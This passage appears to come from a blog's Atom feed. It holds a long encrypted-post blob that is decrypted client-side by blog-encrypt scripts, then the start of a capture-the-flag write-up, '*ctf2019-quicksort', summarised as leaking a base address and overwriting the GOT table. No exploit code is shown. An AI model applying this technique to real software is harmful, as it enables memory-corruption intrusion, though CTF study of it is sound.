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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>*ctf2019-quicksort</title>
      <link href="/2019/05/04/ctf2019-quicksort/"/>
      <url>/2019/05/04/ctf2019-quicksort/</url>
      
        <content type="html"><![CDATA[<p>leak基址+覆写GOT表</p><a id="more"></a><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1g2plw40j34j30ie0cm0uu.jpg" 